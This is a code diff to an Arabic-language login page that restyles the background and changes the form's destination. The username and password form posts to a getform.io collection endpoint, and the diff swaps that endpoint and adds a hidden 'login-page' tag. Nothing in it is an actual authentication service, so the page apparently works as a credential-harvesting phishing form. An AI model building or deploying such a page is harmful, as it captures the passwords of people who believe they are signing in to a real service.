@@ -39,7 +39,7 @@
         background-image: url(image/photo_2025-12-03_01-56-06.jpg);
         background-size: cover;
         background-position: center;
-        filter: blur(4px); /* تأثير الضبابية */
+        filter: blur(1px); /* تأثير الضبابية */
         z-index: -2;
       }
 
@@ -49,12 +49,7 @@
         left: 0;
         width: 100%;
         height: 100%;
-        background-color: rgba(
-          16,
-          33,
-          62,
-          0.75
-        ); /* الطبقة الزرقاء الداكنة الشفافة */
+        background-color: rgba(15, 15, 17, 0.75); /* الطبقة الزرقاء الداكنة الشفافة */
         z-index: -1;
       }
 
@@ -142,29 +137,31 @@
       </div>
 
       <h2>تسجيل الدخول</h2>
-      <form action="https://getform.io/f/agdvylxb" method="POST">
-        <div class="input-group">
-          <input
-            type="text"
-            name="username"
-            placeholder="اسم المستخدم"
-            required
-          />
-        </div>
+      <form action="https://getform.io/f/bjjdedeb" method="POST">
+  <div class="input-group">
+    <input
+      type="text"
+      name="username"
+      placeholder="اسم المستخدم"
+      required
+    />
+  </div>
 
-        <div class="input-group">
-          <input
-            type="password"
-            name="pass"
-            placeholder="كلمة المرور"
-            required
-          />
-        </div>
+  <div class="input-group">
+    <input
+      type="password"
+      name="pass"
+      placeholder="كلمة المرور"
+      required
+    />
+  </div>
 
-        <input type="hidden" name="_gotcha" style="display: none !important" />
+  <input type="hidden" name="_gotcha" style="display:none !important" />
+  <input type="hidden" name="form-type" value="login-page" />
 
-        <button type="submit">دخول</button>
-      </form>
+  <button type="submit">دخول</button>
+</form>
+
     </div>
   </body>
 </html>
